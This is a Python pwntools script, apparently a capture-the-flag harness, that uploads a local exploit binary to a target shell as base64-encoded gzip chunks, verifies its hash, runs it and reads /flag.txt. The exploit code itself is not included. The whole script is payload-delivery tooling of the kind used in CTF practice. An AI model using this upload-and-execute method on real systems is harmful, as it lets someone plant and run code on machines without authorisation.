import gzip
import itertools

from pwn import *

from utils.target import start

exploit_path = Path(__file__).parent / 'exploit'
gzip_exploit_path = exploit_path.with_suffix('.gz')

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()

io.sendlineafter(b'\r\n/ $ ', b'cd /home/user')
io.sendlineafter(b'\r\n/home/user $ ', b'rm -f exploit')

if gzip_exploit_path.exists():
    gzip_exploit_path.unlink()

info(f'Compressing exploit file...')
with exploit_path.open('rb') as raw_exploit_file, gzip.open(gzip_exploit_path, 'wb') as gzip_exploit_file:
    gzip_exploit_file.write(raw_exploit_file.read())

exploit_size = gzip_exploit_path.stat().st_size
exploit_hash = hashlib.sha256(exploit_path.read_bytes()).hexdigest()
bytes_sent = 0

info(f'Sending compressed exploit file ({exploit_size} bytes)...')
with gzip_exploit_path.open('rb') as raw_exploit_file:
    while True:
        raw_exploit_part = raw_exploit_file.read(512)
        if not raw_exploit_part:
            break
        else:
            encoded_exploit_part = base64.b64encode(raw_exploit_part).decode()
            command = f'echo "{encoded_exploit_part}" | base64 -d >> exploit.gz'.encode()
            io.sendlineafter(b'\r\n/home/user $ ', command)
            bytes_sent += len(raw_exploit_part)


io.recvuntil(b'\r\n/home/user $ ')
info(f'Sent compressed exploit file (total of {bytes_sent} bytes)')
info(f'Decompressing exploit file...')
io.sendline(b'gzip -d exploit.gz')

# Validate the exploit
io.sendlineafter(b'\r\n/home/user $ ', b'sha256sum exploit')
io.recvline()
remote_exploit_hash = io.recvuntil(b'  exploit', drop=True).decode()
if remote_exploit_hash != exploit_hash:
    error(f'{remote_exploit_hash} != {exploit_hash}')
else:
    success(f'Exploit file hash matches!')

io.sendlineafter(b'\r\n/home/user $ ', b'chmod +x exploit')

io.sendlineafter(b'\r\n/home/user $ ', b'whoami')
io.recvline()
info(io.recvline().decode())

info(f'Running exploit...')
io.sendlineafter(b'/home/user $ ', b'./exploit')
io.recvline()

result = io.recvuntil(b'\r\n', drop=True).decode()
if result == 'SUCCESS':
    success('Exploit succeeded!')
    io.sendline(b'cat /flag.txt')
    io.recvline()
    flag = io.recvuntil(b"\r\n", drop=True).decode()
    success(f'Flag: `{flag}`')
else:
    error(f'Exploit failed with output:\n{result}!')
